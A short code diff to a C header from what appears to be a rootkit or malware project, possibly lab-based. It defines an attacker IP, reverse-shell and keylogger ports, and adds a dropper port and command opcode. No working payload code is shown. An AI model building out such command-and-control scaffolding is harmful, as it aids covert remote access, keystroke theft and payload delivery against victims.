@@ -14,9 +14,10 @@ typedef uint16_t u16;
 typedef uint32_t u32;
 typedef uint64_t u64;
 
-#define ATTACKER_IP        "192.168.122.1" /* Attacker IP */
+#define ATTACKER_IP        "192.168.122.1"
 #define REVERSE_SHELL_PORT 1337
 #define KEYLOGGER_PORT     1338
+#define DROPPER_PORT       1339
 
 #endif
 
@@ -31,6 +32,8 @@ enum command_opcode {
 
     COMMAND_REVERSE_SHELL_START,
     COMMAND_REVERSE_SHELL_STOP,
+
+    COMMAND_DROPPER,
 
     COMMAND_UNINSTALL,
 };
